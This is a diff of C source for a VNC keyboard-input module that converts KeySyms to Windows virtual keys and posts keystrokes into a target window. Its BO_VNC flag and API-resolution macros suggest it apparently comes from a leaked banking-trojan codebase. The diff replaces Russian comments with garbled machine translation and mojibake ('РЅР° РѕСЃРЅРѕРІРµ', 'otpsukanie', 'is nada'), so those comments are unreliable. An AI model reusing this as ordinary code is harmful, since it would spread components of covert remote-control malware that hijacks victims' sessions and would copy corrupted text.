@@ -12,10 +12,11 @@
 #include "..\..\common\gui.h"
 
 #if(BO_VNC > 0)
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Конвертация KeySym -> Unicode.
-// на основе http://invisible-island.net/xterm/
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Conversion KeySym -> Unicode.
+// РЅР° РѕСЃРЅРѕРІРµ http://invisible-island.net/xterm/
+
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 static const struct
 {
@@ -843,10 +844,10 @@ static WCHAR keySymToUnciode(DWORD keySym)
   return 0;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Конвертация KeySym -> VirtualKey.
-// На основе UltraVNC.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Conversion KeySym -> VirtualKey.
+//В Based on UltraVNC.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #define XK_MISCELLANY
 #define XK_LATIN1
@@ -975,37 +976,35 @@ static WORD keySymToVirtualKey(DWORD keySym)
   return 0;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
-/*
-  Исполнение KeySym.
+/*В В Execution KeySym.
 
-  IN OUT vncProcessData - VNCPROCESSDATA.
-  IN window             - окно, которому нужно отправить сообщение. Не может быть NULL.
-  IN keySym             - KeySym.
-  IN down               - true - нажатие, false - отпсукание.
-*/
+В В IN OUT vncProcessData - VNCPROCESSDATA.
+В В IN window - the window you want to send a message. Can not be NULL.
+В В IN keySym - KeySym.
+В В IN down - true - depression, false - otpsukanie.*/
 static bool executeKeySym(VNCPROCESSDATA *vncProcessData, HWND window, DWORD keySym, bool down)
 {
   DWORD lParam      = down  ? 0 : ((1 << 31) | (1 << 30));
   WORD virtualCode  = keySymToVirtualKey(keySym);
   
-  //Если virtualCode найден.
+  //If virtualCode found.
   if(virtualCode != 0)
   {
-    //Обновляем состяние клавиатуры.
-    updateInputState(vncProcessData, LOBYTE(virtualCode), down); //Т.е. не обновляем состояние символьных клавиш.
+    //Update sostyanie keyboard.
+    updateInputState(vncProcessData, LOBYTE(virtualCode), down); //Ie not update the state of character keys.
 
-    //Скан-код.
+    //Scan code.
     UINT scanCode = CWA(user32, MapVirtualKeyW)(LOBYTE(virtualCode), MAPVK_VK_TO_VSC);
     if(scanCode != 0)lParam |= ((scanCode & 0xff) << 16);
 
-    //Расширениая клавиша.
+    //Extensions key.
     if(HIWORD(virtualCode) == 1)lParam |= (1 << 24);
 
     bool isSysKey = ((vncProcessData->globalData->keysState[VK_MENU] & 0x80) && (vncProcessData->globalData->keysState[VK_CONTROL] & 0x80) == 0);
     
-    //WM_CHAR будет послан автоматически через TranslateMessage, если окну это нада.
+    //WM_CHAR will be sent automatically via TranslateMessage, if the window is nada.
     return(CWA(user32, PostMessageW)(window,
                                      down ? (isSysKey ? WM_SYSKEYDOWN : WM_KEYDOWN) : (isSysKey ? WM_SYSKEYUP : WM_KEYUP),
                                      (WPARAM)LOBYTE(virtualCode),
@@ -1013,7 +1012,7 @@ static bool executeKeySym(VNCPROCESSDATA *vncProcessData, HWND window, DWORD key
                                     );
   }
   
-  //Если юникодовй символ найден, отправляем WM_CHAR.
+  //If a Unicode character is found, send WM_CHAR.
   WCHAR unicodeChar;
   if(down && (unicodeChar = keySymToUnciode(keySym)) != 0)
   {
